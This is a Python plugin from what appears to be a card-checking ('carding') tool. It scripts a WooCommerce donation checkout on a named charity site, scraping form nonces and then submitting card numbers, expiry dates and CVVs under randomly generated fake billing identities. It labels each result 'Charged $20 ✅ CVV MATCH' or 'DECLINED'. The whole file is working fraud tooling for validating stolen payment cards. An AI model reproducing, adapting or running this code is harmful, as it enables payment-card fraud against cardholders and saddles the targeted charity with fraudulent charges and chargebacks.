import re
from mills.plugins._helpers.tools import find_between


def pf_one(r):
    a = r.get('https://bpdk9.com/donations/')
    if not a: return
    b = r.get('https://bpdk9.com/?add-to-cart=650')
    nonce = find_between(b.text, 'type="hidden" id="_wpnonce" name="_wpnonce" value="', '"')
    sec = find_between(b.text, 'update_order_review_nonce":"', '"')
    if not sec or not nonce:return
    return nonce,sec



def pf_two(r, nonce, sec,rand_user, cc,mes,ano,cvv):
    
    c_data  = {
    'security': sec,
    'payment_method': 'paypal',
    'has_full_address': 'true',
    'post_data': f'billing_first_name={rand_user.first_name}&billing_last_name={rand_user.last_name}&billing_company=&billing_phone={rand_user.get_phone}&billing_email={rand_user.get_email}&order_comments=&payment_method=paypal&paypal_pro-card-number=&paypal_pro-card-expiry=&paypal_pro-card-cvc=&_wpnonce={nonce}&_wp_http_referer=%2Fcheckout%2F',
    }

    c = r.post('https://bpdk9.com/?wc-ajax=update_order_review', c_data)
    if not c: return

    d_data = {
    'billing_first_name': rand_user.first_name,
    'billing_last_name': rand_user.last_name,
    'billing_company': '',
    'billing_phone': rand_user.get_phone,
    'billing_email': rand_user.get_email,
    'order_comments': '',
    'payment_method': 'paypal_pro',
    'paypal_pro-card-number': cc,
    'paypal_pro-card-expiry': f'{mes} / {ano}',
    'paypal_pro-card-cvc': cvv,
    '_wpnonce': nonce,
    '_wp_http_referer': '/?wc-ajax=update_order_review',
    }

    d = r.post('https://bpdk9.com/?wc-ajax=checkout', d_data)
    if not d: return
    d_json = d.json()
    if d_json['result'] == 'success':
        print(d_json['redirect'])
        return "Charged $20", "✅", 'CVV MATCH'
    elif 'messages' in d_json:
        messa = re.sub('<[^<]+?>', '', d_json['messages']).strip()
        return messa, "❌", 'DECLINED'
    else:
        print(d.text)
        return d.text, "❌", 'DECLINED'